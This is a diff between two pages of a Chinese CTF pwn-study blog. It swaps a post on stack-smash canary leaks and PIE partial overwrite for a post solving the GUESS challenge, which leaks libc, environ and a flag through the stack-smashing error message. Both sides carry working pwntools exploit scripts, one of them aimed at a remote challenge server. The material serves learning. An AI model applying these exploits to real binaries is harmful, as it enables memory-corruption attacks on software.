@@ -79,23 +79,21 @@
 
 
 
-<meta name="description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
+<meta name="description" content="依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。 stack smashes练习题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧首先保护机制">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwn学习（7）花式栈溢出2">
-<meta property="og:url" content="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/index.html">
+<meta property="og:title" content="pwn学习（8）smashes练习及一周总结">
+<meta property="og:url" content="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/index.html">
 <meta property="og:site_name" content="Asa9ao">
-<meta property="og:description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
+<meta property="og:description" content="依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。 stack smashes练习题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧首先保护机制">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg">
-<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg">
-<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg">
-<meta property="og:updated_time" content="2018-11-22T15:36:13.391Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg">
+<meta property="og:updated_time" content="2018-11-23T13:32:47.521Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwn学习（7）花式栈溢出2">
-<meta name="twitter:description" content="唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。 Stack smash原理我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就">
-<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg">
+<meta name="twitter:title" content="pwn学习（8）smashes练习及一周总结">
+<meta name="twitter:description" content="依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。 stack smashes练习题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧首先保护机制">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg">
 
 
 
@@ -125,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
+  <link rel="canonical" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
 
 
 
 
 
-  <title>pwn学习（7）花式栈溢出2 | Asa9ao</title>
+  <title>pwn学习（8）smashes练习及一周总结 | Asa9ao</title>
   
 
 
@@ -258,7 +256,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/22/pwn学习（7）花式栈溢出2/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/23/pwn学习（8）smashes练习及回顾/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Asa9ao">
@@ -275,7 +273,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">pwn学习（7）花式栈溢出2</h1>
+          <h1 class="post-title" itemprop="name headline">pwn学习（8）smashes练习及一周总结</h1>
         
 
         <div class="post-meta">
@@ -287,8 +285,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-22T21:58:58+08:00">
-                2018-11-22
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-23T20:27:19+08:00">
+                2018-11-23
               </time>
             
 
@@ -347,81 +345,56 @@
       
 
       
-        <p>唉，学业繁忙，计算机网络和数据结构马上就要结课了还要拿出时间来复习，感觉最近时间有些不够用。不抱怨了，还是看看今天看的两个知识点，可能写的不是很详细，主要还是时间不太够了。</p>
-<h1 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们都知道有个保护措施叫canary，简单来讲就是在push ebp之后在栈上放个“哨位”，“监视”你的栈，一旦你想溢出，那势必就会破坏这个“哨位”，程序在最后回去检查这个“哨位”，如果你篡改了，那就会报错了</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh7xp4r3dj30nm030q3o.jpg" alt=""></p>
-<p>如图就是函数在开始时进行的设置“哨位”</p>
-<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxh80n0v9ej30h202mt97.jpg" alt=""></p>
-<p>这是在函数最后的检查</p>
-<p>当然明白了这些还不够，我们还需要知道一点关于这个错误的一些信息，下面我们试着覆盖掉canary来看看会发生什么</p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxh8djl3uuj314s0hcqfn.jpg" alt=""></p>
-<p>可以看到除了程序的输出外，还额外打印了一句</p>
-<pre><code>*** stack smashing detected ***: ./smashes.dms terminated
-</code></pre><p>这就是重点了，他告诉我们出错了，而且附加了我们的程序名字！名字哪来的？大胆猜猜，在开始运行输入的命令行中，arg0就是我们的程序名！当然这是瞎猜的，秉持着唯真求新的校训，我们还是来看一看具体的实现原理</p>
-<pre><code>void __attribute__ ((noreturn)) __stack_chk_fail (void)
-{
-  __fortify_fail (&quot;stack smashing detected&quot;);
-}
-void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
-{
-  /* The loop is added only to keep gcc happy.  */
-  while (1)
-    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,
-                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);
-}
-</code></pre><p>可以看到竟（guo）然（ran）和我们想的一样，那我们就可以想到了，那我们只要覆盖掉arg0，那我们岂不是就可以借助这个输入拿到我们想要的信息了？</p>
-<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>知道了原理那就赶紧做个题目练练手吧，题目来自jarvis oj，名字是smashes，大家可以自己去下载一下</p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh8ssx30tj310o0isjvd.jpg" alt=""></p>
-<p>保护开启了nx、canary，ida看一下发现有明显的栈溢出漏洞，但还有个很好玩的地方，在我们输入第二个字符串后，它会将某个地址里的内容覆盖掉。我们查看后发现被覆盖掉的地方就是flag的存储位置。</p>
-<p>那么问题来了，不管输入什么我们的flag都会被覆盖，那一定flag就会被改掉吗？当然不是，这里需要一个小知识点了</p>
-<p><strong>在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</strong></p>
-<p>我们利用find CTF的方式就可以找到flag的另一处地址，紧接着我们可以在arg0上放入我们的flag地址，借助canary的错误机制将其打印出来，当然过程中需要使用gdb调试来获得包括arg0的地址、变量的地址等等，这就不细说了，直接上脚本了</p>
+        <p>依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。</p>
+<h1 id="stack-smashes练习"><a href="#stack-smashes练习" class="headerlink" title="stack smashes练习"></a>stack smashes练习</h1><p>题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧<br><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxianon45dj312m0n079m.jpg" alt=""><br>首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。</p>
+<p>看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fxiayuqsnmj313001ojsj.jpg" alt=""></p>
+<p>拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNbRwly1fxib12tuidj30mw02iq3m.jpg" alt=""><br>明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。</p>
+<p>程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。</p>
+<p>那就说明我们要分三步走：</p>
+<ul>
+<li>利用smashes获取libc中的函数，比如puts</li>
+<li>利用smashes获取environ</li>
+<li>利用smashes获取flag</li>
+</ul>
+<p>那就来看看exp吧</p>
 <pre><code>from pwn import *
-#p = process(&apos;./smashes.dms&apos;)
-p = remote(&apos;pwn.jarvisoj.com&apos;, 9877)
-flag_addr = 0x400d21
-arg0_addr = 0x7fffffffdf48
-name_addr = 0x7fffffffdd30
-payload = (arg0_addr - name_addr)*&apos;a&apos; + p64(flag_addr)
+arg0_addr = 0x7fffffffdf68
+input_addr = 0x7fffffffde40
+#context.log_level = &apos;debug&apos;
+p = process(&apos;./GUESS.dms&apos;)
+elf = ELF(&apos;./GUESS.dms&apos;)
+e = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
 
-p.recvuntil(&apos;name? &apos;)
+flag_addr = 0x7fffffffde10
+puts_addr = 0x602020
+p.recvuntil(&apos;flag&apos;)
+payload = (arg0_addr - input_addr)*&apos;a&apos; +p64(puts_addr)
 p.sendline(payload)
-p.recvuntil(&apos;flag: &apos;)
-p.sendline(&apos;bb&apos;)
-data = p.recv()
-log.info(data)
-</code></pre><p>要注意因为我们只是拿到了flag并没有get shell，所以最后不进行交互也可以，打印出来就好了</p>
-<h1 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>在程序开启了 PIE 保护时 (PIE enabled) 高位的地址会发生随机化, 但低位的偏移是始终固定的, 也就是说如果我们能更改低位的偏移, 就可以在一定程度上控制程序的执行流, 绕过 PIE 保护</p>
-<h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><p>原理看上去有点难以理解，但有了例题就好理解多了，题目是安恒杯 2018 年 7 月月赛的 babypie </p>
-<p><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fxh975vl2xj30ke08iq4o.jpg" alt=""></p>
-<p>保护开启了canary和pie，还是ida分析发现明显的栈溢出，这里就要用到一个骚操作了，我们看到read了最大0x30的字节，我们又知道read是不会给输入的字符串加上\0的结束符的，而printf又是读到00字节才结束输出，那也就是说我们可以输入一部分内容，然后顺带着输出canary，之后再进行栈溢出的时候我们就可以恢复canary的值了</p>
-<p>那具体该怎么实现呢？首先是ebp的地址离我们输入的buf偏移是0x30，当然ebp之后还有个0x8大小的canary，canary的最低字节是00，为了输出cannary剩下的值我们把这里也覆盖掉，也就是覆盖的字节数应该是0x30 - 0x8 + 1这么个大小</p>
-<p>拿到canary后我们就可以考虑如何构造payload了，因为程序中给了get shell函数，所以我们直接用ida得到的地址（可不是真实地址哦）来覆盖函数返回地址的低位，然后就是听天由命了，总有对的时候</p>
-<p>思路齐全，上exp喽</p>
-<pre><code>#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-#  context.log_level = &quot;debug&quot;
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
+log.info(hex(puts_addr))
 
+libc = puts_addr - e.symbols[&apos;puts&apos;]
+environ_addr = libc + e.symbols[&apos;__environ&apos;]
+log.info(hex(libc))
 
-while True:
-    try:
-        io = process(&quot;./babypie.dms&quot;, timeout = 1)
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(environ_addr))
+p.recvuntil(&apos;*** stack smashing detected ***: &apos;)
+stack = u64(p.recv(6).ljust(8, &apos;\x00&apos;))
+log.info(hex(stack))
 
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8 + 1))
-        io.recvuntil(&apos;a&apos; * (0x30 - 0x8 + 1))
-        canary = &apos;\0&apos; + io.recvn(7)
-        success(canary.encode(&apos;hex&apos;))
+flag_addr = stack - 0x168
 
-        #  gdb.attach(io)
-        io.sendafter(&quot;:\n&quot;, &apos;a&apos; * (0x30 - 0x8) + canary + &apos;bbbbbbbb&apos; + &apos;\x3E\x0A&apos;)
+p.recvuntil(&apos;flag&apos;)
+p.sendline((arg0_addr - input_addr)*&apos;a&apos; + p64(flag_addr))
 
-        io.interactive()
-    except Exception as e:
-        io.close()
-        print e
-</code></pre><p>Successful</p>
+p.interactive()
+</code></pre><p>各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.</p>
+<h1 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h1><p>这一周主要是学习了基础的ROP和花式溢出，另外还有一些格式化字符串漏洞的相关知识，当然除此之外还有一些pwntools的使用技巧和peda的调试技巧，也不知道这样的速度合不合适，但自己感觉需要好好总结回顾一下了，之后会利用周六把这周的东西重新捋一遍，看看还有没有什么新的发现或者是遗漏。</p>
+<p>sucessful</p>
 
       
     </div>
@@ -446,8 +419,8 @@ while True:
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/11/21/pwn学习（6）花式栈溢出1/" rel="next" title="pwn学习（6）花式栈溢出1">
-                <i class="fa fa-chevron-left"></i> pwn学习（6）花式栈溢出1
+              <a href="/2018/11/22/pwn学习（7）花式栈溢出2/" rel="next" title="pwn学习（7）花式栈溢出2">
+                <i class="fa fa-chevron-left"></i> pwn学习（7）花式栈溢出2
               </a>
             
           </div>
@@ -455,10 +428,6 @@ while True:
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/11/23/pwn学习（8）smashes练习及回顾/" rel="prev" title="pwn学习（8）smashes练习及一周总结">
-                pwn学习（8）smashes练习及一周总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -590,7 +559,7 @@ while True:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Stack-smash"><span class="nav-number">1.</span> <span class="nav-text">Stack smash</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题"><span class="nav-number">1.2.</span> <span class="nav-text">例题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#栈上的-partial-overwrite"><span class="nav-number">2.</span> <span class="nav-text">栈上的 partial overwrite</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理-1"><span class="nav-number">2.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题-1"><span class="nav-number">2.2.</span> <span class="nav-text">例题</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#stack-smashes练习"><span class="nav-number">1.</span> <span class="nav-text">stack smashes练习</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#简单总结"><span class="nav-number">2.</span> <span class="nav-text">简单总结</span></a></li></ol></div>
             
 
           </div>
